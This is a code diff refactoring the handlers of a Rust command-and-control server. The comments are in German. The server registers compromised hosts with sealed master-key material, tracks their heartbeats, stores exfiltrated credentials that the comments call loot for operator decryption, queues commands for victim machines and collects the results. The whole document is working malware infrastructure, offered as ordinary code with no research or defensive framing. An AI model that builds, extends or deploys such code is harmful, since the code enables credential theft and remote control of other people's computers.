@@ -24,11 +24,11 @@ use axum::{
 };
 use axum_server::tls_rustls::RustlsConfig;
 use clap::Parser;
-use db::{Db, HostRow, SecretRow};
+use db::Db;
 use kx_core::c2::{
-    self, CreateTaskRequest, HeartbeatRequest, LoginRequest, RegisterRequest, SecretUpload,
+    CreateTaskRequest, HeartbeatRequest, LoginRequest, RegisterRequest, SecretUpload,
     TaskResultRequest, PATH_HEARTBEAT, PATH_HOSTS, PATH_LOGIN, PATH_REGISTER, PATH_SECRETS,
-    PATH_TASKS, PATH_TASKS_CREATE, PATH_TASKS_RESULT, STATUS_PENDING,
+    PATH_TASKS, PATH_TASKS_CREATE, PATH_TASKS_RESULT,
 };
 use uuid::Uuid;
 
@@ -88,44 +88,34 @@ async fn register(
     if req.host_id.is_empty() {
         return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
     }
-    let now = kx_core::util::now_rfc3339();
-    let host = HostRow {
-        id: req.host_id,
-        ip: req.ip,
-        hostname: req.hostname.unwrap_or_default(),
-        os: req.os.unwrap_or_default(),
-        status: req.status.unwrap_or_else(|| c2::STATUS_DISCOVERED.into()),
-        first_seen: now.clone(),
-        last_seen: now,
-        // Das versiegelte Master-Key-Material: der Operator gewinnt daraus den
-        // Master-Key und entschluesselt damit die Secrets dieses Hosts.
-        sealed_master: req.sealed_master.unwrap_or_default(),
-    };
-    match st.db.upsert_host(&host) {
+    // Das versiegelte Master-Key-Material reist mit dem Request mit: der
+    // Operator gewinnt daraus den Master-Key und entschluesselt damit die
+    // Secrets dieses Hosts. Die Datenbank uebersetzt den Request in ihre
+    // Zeile — der Handler kennt die Spalten nicht.
+    match st.db.upsert_host(&req) {
         Ok(()) => StatusCode::CREATED.into_response(),
         Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
     }
 }
 
 /// Aktualisiert das Last-Seen eines Hosts.
+///
+/// Der Heartbeat meldet genau eine Sache: dieser Host lebt noch. Er ersetzt
+/// keine anderen Felder — das Lesen aller Hosts und Zurueckschreiben war ein
+/// Umweg, der die Zeile des Hosts nur wegen eines Zeitstempels anfasste.
 async fn heartbeat(
     State(st): State<AppState>,
     Json(req): Json<HeartbeatRequest>,
 ) -> impl IntoResponse {
-    let hosts = match st.db.list_hosts() {
-        Ok(h) => h,
-        Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
-    };
-    if let Some(h) = hosts.into_iter().find(|h| h.id == req.host_id) {
-        let mut h = h;
-        h.last_seen = kx_core::util::now_rfc3339();
-        if st.db.upsert_host(&h).is_ok() {
-            StatusCode::OK.into_response()
-        } else {
-            StatusCode::INTERNAL_SERVER_ERROR.into_response()
-        }
-    } else {
-        StatusCode::NOT_FOUND.into_response()
+    if req.host_id.is_empty() {
+        return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
+    }
+    match st.db.touch_host(&req.host_id) {
+        Ok(true) => StatusCode::OK.into_response(),
+        // Der Host ist dem Server unbekannt. Der Agent kann daran erkennen,
+        // dass sein Heartbeat ins Leere lief.
+        Ok(false) => StatusCode::NOT_FOUND.into_response(),
+        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
     }
 }
 
@@ -140,24 +130,9 @@ async fn upload_secret(
     // Kommt das Secret versiegelt an, wird der Klartext verworfen — auf dem
     // C2 liegt die Beute dann nur noch verschluesselt. Ohne Siegel (Agent
     // ohne Server-Schluessel) bleibt der Klartext, sonst gaebe es nichts zu
-    // entschluesseln.
-    let sealed_password = req.sealed_password.unwrap_or_default();
-    let password = if sealed_password.is_empty() {
-        req.password
-    } else {
-        String::new()
-    };
-    let secret = SecretRow {
-        id: Uuid::new_v4().to_string(),
-        host_id: req.host_id,
-        cred_type: req.cred_type,
-        username: req.username,
-        password,
-        source: req.source.unwrap_or_default(),
-        collected_at: kx_core::util::now_rfc3339(),
-        versiegelt: sealed_password,
-    };
-    match st.db.insert_secret(&secret) {
+    // entschluesseln. Diese Regel steht in der Datenbank, neben der Zeile,
+    // die sie betrifft.
+    match st.db.insert_secret(&req) {
         Ok(()) => StatusCode::CREATED.into_response(),
         Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
     }
@@ -166,10 +141,7 @@ async fn upload_secret(
 /// Liefert alle Hosts als JSON.
 async fn list_hosts(State(st): State<AppState>) -> impl IntoResponse {
     match st.db.list_hosts() {
-        Ok(rows) => {
-            let hosts: Vec<c2::Host> = rows.into_iter().map(c2::Host::from).collect();
-            Json(hosts).into_response()
-        }
+        Ok(hosts) => Json(hosts).into_response(),
         Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
     }
 }
@@ -177,11 +149,7 @@ async fn list_hosts(State(st): State<AppState>) -> impl IntoResponse {
 /// Liefert alle Secrets als JSON.
 async fn list_secrets(State(st): State<AppState>) -> impl IntoResponse {
     match st.db.list_secrets() {
-        Ok(rows) => {
-            let secrets: Vec<c2::ExfiltratedSecret> =
-                rows.into_iter().map(c2::ExfiltratedSecret::from).collect();
-            Json(secrets).into_response()
-        }
+        Ok(secrets) => Json(secrets).into_response(),
         Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
     }
 }
@@ -197,18 +165,10 @@ async fn create_task(
     if req.host_id.is_empty() {
         return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
     }
-    let task = db::TaskRow {
-        id: Uuid::new_v4().to_string(),
-        host_id: req.host_id.clone(),
-        command: req.command.clone(),
-        status: STATUS_PENDING.to_string(),
-        result: String::new(),
-        created_at: kx_core::util::now_rfc3339(),
-    };
-    match st.db.insert_task(&task) {
+    match st.db.insert_task(&req) {
         // Der angelegte Task wird zurückgeliefert: der Operator braucht die
         // ID, um das Ergebnis später zuzuordnen.
-        Ok(_) => (StatusCode::CREATED, Json(c2::Task::from(task))).into_response(),
+        Ok(task) => (StatusCode::CREATED, Json(task)).into_response(),
         Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
     }
 }
@@ -239,10 +199,7 @@ async fn report_task_result(
 /// Liefert alle Tasks als JSON.
 async fn list_tasks(State(st): State<AppState>) -> impl IntoResponse {
     match st.db.list_tasks() {
-        Ok(rows) => {
-            let tasks: Vec<c2::Task> = rows.into_iter().map(c2::Task::from).collect();
-            Json(tasks).into_response()
-        }
+        Ok(tasks) => Json(tasks).into_response(),
         Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
     }
 }
